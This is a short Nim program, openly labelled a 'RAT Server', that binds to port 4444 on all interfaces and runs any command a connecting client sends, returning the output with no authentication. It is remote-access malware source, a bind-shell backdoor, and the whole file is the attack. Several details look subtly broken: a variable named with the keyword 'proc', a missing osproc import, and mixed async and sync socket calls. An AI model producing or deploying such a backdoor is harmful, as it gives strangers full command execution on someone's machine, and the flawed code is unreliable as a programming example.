import os, socket, strutils, asyncdispatch, times, threadpool

const CONFIG = "0.0.0.0"
const PORT = 4444

proc execute_command(command: string): string =
  try:
    let proc = execProcess(command, options = {poUsePath, poEvalCommand})
    return proc
  except:
    return "Error executing command"

proc handle_client(client: Socket) =
  defer: client.close()
  while true:
    try:
      let data = recv(client, 1024)
      if data.len == 0: break
      
      let command = strip(data)
      if command == "exit":
        break
      
      echo "Executing: " & command
      let result = execute_command(command)
      send(client, result)
    except:
      break

proc start_server() =
  var server = newAsyncSocket()
  bindAddr(server, PORT)
  server.listen(5)
  echo "RAT Server listening on port " & $PORT
  
  while true:
    let client = server.accept()
    spawn handle_client(client)

when isMainModule:
  start_server()